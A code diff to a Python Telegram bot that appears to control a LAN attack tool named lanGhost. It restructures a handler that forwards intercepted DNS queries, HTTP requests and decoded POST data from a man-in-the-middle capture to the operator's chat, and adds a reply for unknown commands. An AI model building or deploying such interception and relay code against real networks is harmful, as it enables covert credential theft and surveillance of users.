@@ -239,22 +239,21 @@ def mitmHandler(target, ID, bot):
                 DBcursor = DBconn.cursor()
                 textline = "📱 MITM - " + target[0] + "\n\n"
                 for item in data:
+                    if item[6] == "1":
+                        temp_textline = "DNS"+ " ➖ " + str(item[2]) + " ➡️ " + str(item[5]) + "\n\n"
+                        if len(textline + temp_textline) > 3000:
+                            break
+                        textline += temp_textline
+                    elif item[4] == "POST":
+                        temp_textline = str(item[4]) + " ➖ " + str(item[3]) + "\n📄 POST DATA:\n" + urllib.parse.unquote(item[5]) + "\n\n"
+                        if len(textline + temp_textline) > 3000:
+                            break
+                        textline += temp_textline
                     else:
-                        if item[6] == "1":
-                            temp_textline = "DNS"+ " ➖ " + str(item[2]) + " ➡️ " + str(item[5]) + "\n\n"
-                            if len(textline + temp_textline) > 3000:
-                                break
-                            textline += temp_textline
-                        elif item[4] == "POST":
-                            temp_textline = str(item[4]) + " ➖ " + str(item[3]) + "\n📄 POST DATA:\n" + urllib.parse.unquote(item[5]) + "\n\n"
-                            if len(textline + temp_textline) > 3000:
-                                break
-                            textline += temp_textline
-                        else:
-                            temp_textline = str(item[4]) + " ➖ " + str(item[3]) + "\n\n"
-                            if len(textline + temp_textline) > 3000:
-                                break
-                            textline += temp_textline
+                        temp_textline = str(item[4]) + " ➖ " + str(item[3]) + "\n\n"
+                        if len(textline + temp_textline) > 3000:
+                            break
+                        textline += temp_textline
                     DBcursor.execute("DELETE FROM lanGhost_mitm WHERE id=?", [str(item[0])])
                     DBconn.commit()
                 if not textline == "📱 MITM - " + target[0] + "\n\n":
@@ -726,6 +725,17 @@ def msg_help(bot, update):
         bot.send_message(chat_id=update.message.chat_id, text="❌ Whooops, something went wrong... Please try again.")
 
 
+def msg_unknown(bot, update):
+    global admin_chatid
+    if not str(update.message.chat_id) == str(admin_chatid):
+        return
+
+    try:
+        bot.send_message(chat_id=update.message.chat_id, text="⚠️ Sorry, I didn't understand that command. Type /help to get a list of available commands.")
+    except:
+        print("[!!!] " + str(traceback.format_exc()))
+        bot.send_message(chat_id=update.message.chat_id, text="❌ Whooops, something went wrong... Please try again.")
+
 def main():
     global admin_chatid
 
@@ -761,6 +771,9 @@ def main():
     dispatcher.add_handler(spoofdns_handler)
     help_handler = CommandHandler('help', msg_help)
     dispatcher.add_handler(help_handler)
+
+    dispatcher.add_handler(MessageHandler(Filters.text, msg_unknown))
+    dispatcher.add_handler(MessageHandler(Filters.command, msg_unknown))
 
     print("[+] Telegram bot started...")
     while True:
